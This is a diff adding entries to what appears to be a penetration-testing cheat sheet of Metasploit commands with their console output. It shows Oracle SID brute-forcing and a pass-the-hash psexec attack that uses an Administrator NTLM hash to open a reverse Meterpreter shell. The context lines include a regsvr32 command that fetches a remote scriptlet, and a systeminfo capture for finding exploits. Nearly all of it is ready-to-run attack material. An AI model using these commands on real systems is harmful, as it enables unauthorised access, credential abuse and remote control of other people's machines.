@@ -382,6 +382,46 @@ regsvr32 /s /n /u /i:http://x.x.x.x:8080/IYh8OzEYxNRCQ.sct scrobj.dll
 [*] Meterpreter session 1 opened (x.x.x.x:4444 -> x.x.x.x:49162) at 2019-11-07 18:22:47 +0000
 
 
+
+#Bruteforce System Identifier Oracle
+msf5 auxiliary(scanner/oracle/tnspoison_checker) > use auxiliary/admin/oracle/sid_brute
+msf5 auxiliary(admin/oracle/sid_brute) > set RHOSTS x.x.x.x
+RHOSTS => x.x.x.x
+msf5 auxiliary(admin/oracle/sid_brute) > run
+[*] Running module against x.x.x.x
+
+[*] x.x.x.x:1521 - Starting brute force on x.x.x.x, using sids from /opt/metasploit/data/wordlists/sid.txt...
+[+] x.x.x.x:1521 - x.x.x.x:1521 Found SID 'XE'
+[+] x.x.x.x:1521 - x.x.x.x:1521 Found SID 'PLSExtProc'
+
+
+[+] x.x.x.x:1521 - x.x.x.x:1521 Found SID 'CLRExtProc'
+[+] x.x.x.x:1521 - x.x.x.x:1521 Found SID ''
+[*] x.x.x.x:1521 - Done with brute force...
+
+
+#Pass the hash against SMB
+#Obtain from 
+
+msf5 exploit(windows/smb/psexec) > set LHOST tun0
+LHOST => tun0
+msf5 exploit(windows/smb/psexec) > set SMBUser Administrator
+SMBUser => Administrator
+msf5 exploit(windows/smb/psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7
+SMBPass => aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7
+msf5 exploit(windows/smb/psexec) > exploit
+
+[*] Started reverse TCP handler on x.x.x.x:4444 
+[*] x.x.x.x:445 - Connecting to the server...
+[*] x.x.x.x:445 - Authenticating to x.x.x.x:445 as user 'Administrator'...
+[*] x.x.x.x:445 - Selecting PowerShell target
+[*] x.x.x.x:445 - Executing the payload...
+[+] x.x.x.x:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (180291 bytes) to x.x.x.x
+[*] Meterpreter session 1 opened (x.x.x.x:4444 -> x.x.x.x:49168) at 2019-11-10 19:58:38 +0000
+
+
+
 #Save Windows systeminfo for searching exploits
 meterpreter > execute -f "cmd.exe /c systeminfo > systeminfo.txt"
 Process 2284 created.
